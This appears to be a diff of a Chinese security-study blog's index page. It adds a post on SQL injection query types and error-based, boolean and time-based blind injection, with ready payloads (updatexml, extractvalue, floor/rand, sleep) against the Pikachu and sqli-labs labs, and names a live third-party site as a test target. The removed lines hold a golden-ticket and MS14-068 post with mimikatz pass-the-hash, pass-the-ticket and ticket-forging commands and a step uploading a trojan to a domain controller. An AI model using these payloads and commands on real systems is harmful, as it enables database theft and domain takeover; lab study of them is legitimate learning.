@@ -64,6 +64,65 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql漏洞查询方式和报错盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time datetime="2021-10-05T13:57:54.000Z" itemprop="datePublished">2021-10-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">sql漏洞查询方式和报错盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="数据库查询方式"><a href="#数据库查询方式" class="headerlink" title="数据库查询方式"></a>数据库查询方式</h4><h5 id="select-查询数据"><a href="#select-查询数据" class="headerlink" title="select 查询数据"></a>select 查询数据</h5><p>在网站应用中进行数据显示查询操作<br>例：select * from news where id=$id</p>
+<h5 id="insert-插入数据"><a href="#insert-插入数据" class="headerlink" title="insert 插入数据"></a>insert 插入数据</h5><p>在网站应用中进行用户注册添加等操作<br>例：insert into news(id,url,text) values(2,’x’,’$t’)</p>
+<h5 id="delete-删除数据"><a href="#delete-删除数据" class="headerlink" title="delete 删除数据"></a>delete 删除数据</h5><p>后台管理里面删除文章删除用户等操作<br>例：delete from news where id=$id</p>
+<h5 id="update-更新数据"><a href="#update-更新数据" class="headerlink" title="update 更新数据"></a>update 更新数据</h5><p>会员或后台中心数据同步或缓存等操作<br>例：update user set pwd=’$p’ where id=2 and username=’admin’</p>
+<p>重点理解：<br>我们可以通过以上查询方式与网站应用的关系<br>注入点产生地方或应用猜测到对方的SQL查询方式 </p>
+<h4 id="SQL注入报错盲注"><a href="#SQL注入报错盲注" class="headerlink" title="SQL注入报错盲注"></a>SQL注入报错盲注</h4><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
+<h5 id="1、基于报错的SQL盲注-报错回显"><a href="#1、基于报错的SQL盲注-报错回显" class="headerlink" title="1、基于报错的SQL盲注-报错回显"></a>1、基于报错的SQL盲注-报错回显</h5><p>floor，updatexml，extractvalue<br>原理：采用sql语句的特性使之报错回显在页面上</p>
+<h5 id="2、基于布尔的SQL盲注-逻辑判断"><a href="#2、基于布尔的SQL盲注-逻辑判断" class="headerlink" title="2、基于布尔的SQL盲注-逻辑判断"></a>2、基于布尔的SQL盲注-逻辑判断</h5><p>regexp,like,ascii,left,ord,mid<br>原理：通过sql语句逻辑判断信息内容</p>
+<h5 id="3、基于时间的SQL盲注-延时判断"><a href="#3、基于时间的SQL盲注-延时判断" class="headerlink" title="3、基于时间的SQL盲注-延时判断"></a>3、基于时间的SQL盲注-延时判断</h5><p>if,sleep<br>select if(database()=’pikachu’,123,456);<br>原理：通过响应页面时长判断信息内容</p>
+<p>192.168.80.140/sqlilabs/Less-5/?id=1’ and sleep(if(database()=’aaa’,5,0))</p>
+<p>参考：<br>like ‘ro%’                         #判断ro或ro…是否成立<br>regexp ‘^yucedu…’         #匹配yucedu及yucedu…等<br>if(条件,5,0)                       #条件成立 返回5 反之 返回0<br>sleep(5)                           #SQL语句延时执行5秒<br>mid(a,b,c)                        #从位置b(第一位从1开始算)开始，截取a字符串的c位<br>substr(a,b,c)                    #从b位置开始，截取字符串a的c个字符<br>left(database(),1)             #left(a,b)从左侧截取a的前b位<br>length(database())=8      #判断数据库database()名的长度<br>ord=ascii ascii(x)=97       #判断x的ascii码是否大于小于等于97<br>    0=48 a=97 A=65</p>
+<p>各种查询方式注入测试(报错盲注)<br>sqlilabs-less5注入测试(布尔盲注）<br>sqlilabs-less2注入测试(延时盲注）<br>网上实例演示  <a target="_blank" rel="noopener" href="http://techmart.com.hk/Coating_Services/latest_news_detail.php?id=1">http://techmart.com.hk/Coating_Services/latest_news_detail.php?id=1</a></p>
+<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h4><h5 id="pikachu-insert"><a href="#pikachu-insert" class="headerlink" title="pikachu insert"></a>pikachu insert</h5><p>username=x’ or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ‘<br>&amp;password=admin&amp;sex=%E7%94%B7&amp;phonenum=13333333333&amp;email=fuzhou&amp;add=fujian&amp;submit=submit</p>
+<p>username=x’ or updatexml(1,concat(0x7e,(version())),0) or ‘<br>&amp;password=admin&amp;sex=%E7%94%B7&amp;phonenum=13333333333&amp;email=fuzhou&amp;add=fujian&amp;submit=submit</p>
+<p>username=x’ or extractvalue(1,concat(0x7e,database())) or ‘<br>&amp;password=admin&amp;sex=%E7%94%B7&amp;phonenum=13333333333&amp;email=fuzhou&amp;add=fujian&amp;submit=submit</p>
+<h5 id="pikachu-update"><a href="#pikachu-update" class="headerlink" title="pikachu update"></a>pikachu update</h5><p>sex=%E7%94%B7&amp;phonenum=13333333333&amp;add=hubeNicky’ or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or ‘&amp;email=fuzhou&amp;submit=submit</p>
+<p>sex=%E7%94%B7&amp;phonenum=13333333333&amp;add=hubeNicky’ or  updatexml(1,concat(0x7e,(version())),0) or ‘&amp;email=fuzhou&amp;submit=submit</p>
+<p>sex=%E7%94%B7&amp;phonenum=13333333333&amp;add=Nicky’ or extractvalue(1,concat(0x7e,database())) or ‘&amp;email=fuzhou&amp;submit=submit</p>
+<h5 id="pikachu-delete"><a href="#pikachu-delete" class="headerlink" title="pikachu delete"></a>pikachu delete</h5><p>/pikachu/vul/sqli/sqli_del.php?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</p>
+<p>pikachu/vul/sqli/sqli_del.php?id=56+or+updatexml+(1,concat(0x7e,database()),0)</p>
+<p>/pikachu/vul/sqli/sqli_del.php?id=56+or+extractvalue(1,concat(0x7e,database()))</p>
+<h5 id="延时盲注："><a href="#延时盲注：" class="headerlink" title="延时盲注："></a>延时盲注：</h5><p>and if(ascii(substr(database(),1,1))=115,sleep(5),1)–+<br>and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),0)–+</p>
+<h5 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h5><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a>   12种报错注入+万能语句</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" data-id="ckue5or3q000kk4vjc4fsfz5x" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql高低权限注入和敏感文件读写" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" class="article-date">
@@ -100,7 +159,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="cku7nx95n000hfsvj6n6xemvw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="ckue5or3p000jk4vj8o7158bo" class="article-share-link">Share</a>
       
       
     </footer>
@@ -143,7 +202,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="cku7nx95s000mfsvjamki8b39" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="ckue5or3p000ik4vj2g3j9tem" class="article-share-link">Share</a>
       
       
     </footer>
@@ -199,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" data-id="cku7nx95m000gfsvjd12a76cl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" data-id="ckue5or3f000gk4vjb7vo12mq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -253,7 +312,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="cku7nx95t000nfsvjfi991d7d" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="ckue5or3s000mk4vj2kxf42cw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -299,7 +358,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="cku7nx95v000qfsvj8su32y8d" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckue5or3w000tk4vjd4b21nld" class="article-share-link">Share</a>
       
       
     </footer>
@@ -338,7 +397,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="cku7nx9540008fsvj5zrt1nns" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckue5or38000ak4vj0hst997r" class="article-share-link">Share</a>
       
       
     </footer>
@@ -394,7 +453,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="cku7nx961000xfsvjhr7cdan4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckue5or40000yk4vj35bs1bmn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -437,7 +496,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="cku7nx9510007fsvj1p673pdq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckue5or350007k4vjgoub8df5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -482,7 +541,7 @@
 <li><p>做信息搜集</p>
 </li>
 <li><p>用ms14-068向域控提权</p>
-<p>ms14068 -u <a href="mailto:&#105;&#x6c;&#x75;&#x40;&#x69;&#x6c;&#117;&#x2e;&#99;&#111;&#109;">&#105;&#x6c;&#x75;&#x40;&#x69;&#x6c;&#117;&#x2e;&#99;&#111;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>ms14068 -u <a href="mailto:&#105;&#x6c;&#117;&#x40;&#x69;&#x6c;&#117;&#x2e;&#x63;&#x6f;&#109;">&#105;&#x6c;&#117;&#x40;&#x69;&#x6c;&#117;&#x2e;&#x63;&#x6f;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
 <p>注入之前: 需要清除票据</p>
 <p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
 <p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
@@ -550,82 +609,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="cku7nx95y000ufsvjcnhfgyqd" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-黄金票据" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" class="article-date">
-  <time datetime="2021-09-02T14:15:35.000Z" itemprop="datePublished">2021-09-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/">黄金票据</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="kerberos协议和黄金票据"><a href="#kerberos协议和黄金票据" class="headerlink" title="kerberos协议和黄金票据"></a>kerberos协议和黄金票据</h1><p>VM克隆: 右键选项卡 ==&gt; 管理 ==&gt; 克隆</p>
-<p>链接克隆: 相当于快捷方式, 用的是原本镜像, 不会多占用太多空间, 跟原本镜像互不影响, 但是删除原本镜像, 链接克隆的就没用了.</p>
-<p>完整克隆: 相当于复制了一份镜像</p>
-<h5 id="PTH进3389端口"><a href="#PTH进3389端口" class="headerlink" title="PTH进3389端口"></a><code>PTH进3389端口</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:xx &#x2F;domian:xx &#x2F;ntlm:xx &#x2F;run:&quot;mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>AS（Authentication Server）= 认证服务器</p>
-<p>KDC（Key Distribution Center）= 密钥分发中心</p>
-<p>TGT（Ticket Granting Ticket）= 票据授权票据，票据的票据</p>
-<p>TGS（Ticket Granting Server）= 票据授权服务器</p>
-<p>SS（Service Server）= 特定服务提供端</p>
-<h2 id="PASS-THE-TICKET"><a href="#PASS-THE-TICKET" class="headerlink" title="PASS THE TICKET"></a>PASS THE TICKET</h2><p><code>金票(golden ticket): 可以访问任意的服务, 权限较高</code></p>
-<p>银票(silver ticket): 可以访问指定服务, 权限较低</p>
-<h4 id="漏洞利用-MS14-068"><a href="#漏洞利用-MS14-068" class="headerlink" title="漏洞利用(MS14-068):"></a>漏洞利用(MS14-068):</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MS14-068:</span><br><span class="line">MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其</span><br><span class="line">Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证。</span><br><span class="line">影响范围：</span><br><span class="line">Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 及 Windows Server 2012 R2 、Windows Vista、Windows 7、Windows 8 及 Windows 8.1版本</span><br><span class="line"></span><br><span class="line">补丁编号: KB3011780</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ol>
-<li>拿到域控中某台主机的权限, 并提权</li>
-<li>进本的信息搜集, 密码hash, 用户的sid, 域名信息</li>
-<li>没有打过补丁KB3011780</li>
-</ol>
-<h5 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h5><p>搜集信息: </p>
-<p>​    whoami /user ==&gt; 获取sid</p>
-<p>​    ipconfig /all ==&gt; 域名, 域控ip</p>
-<p>​    hashdump  | mimikatz ==&gt; 账户hash</p>
-<p>​    msf身份盗用: steal_token pid</p>
-<p>​    msf身份恢复: rev2self</p>
-<p>ms14-068:</p>
-<p>ms14-068 -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p clear_password</p>
-<p>注入之前: 需要清除票据</p>
-<p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
-<p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
-<p>清除票据后注入票据:</p>
-<p>mimikatz “privilege::debug” “kerberos::ptc xxxx.ccache” exit</p>
-<p>dir \\域控主机名\C$  ==&gt; <code>访问成功即漏洞利用成功, 拿到域控权限</code></p>
-<h4 id="golden-ticket"><a href="#golden-ticket" class="headerlink" title="golden ticket"></a>golden ticket</h4><p>​    前提: 拿下域控的权限(提权), 获取到域控的krbtgt账户密码(hash) </p>
-<p>​    copy shell.exe \WIN-AFETP0IBEKR\C$ ==&gt; 上传木马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;domain:ilu.com &#x2F;sid:S-1-5-21-542716808-1865610110-2530282010 &#x2F;krbtgt:9d093f0496bcbbf9999845340c57cd6b &#x2F;ticket:gold.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::ptt gold.kirbi</span><br><span class="line"></span><br><span class="line">dir \\域控主机名\C$</span><br><span class="line">上传用copy</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="cku7nx960000wfsvjf2jvavop" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckue5or3y000vk4vjakvlcq4c" class="article-share-link">Share</a>
       
       
     </footer>
@@ -671,6 +655,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">sql漏洞查询方式和报错盲注</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">高低权限注入和敏感文件读写</a>
           </li>
         
@@ -684,10 +672,6 @@
         
           <li>
             <a href="/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/">信息资产收集</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/">加密编码算法和CDN绕过</a>
           </li>
         
       </ul>
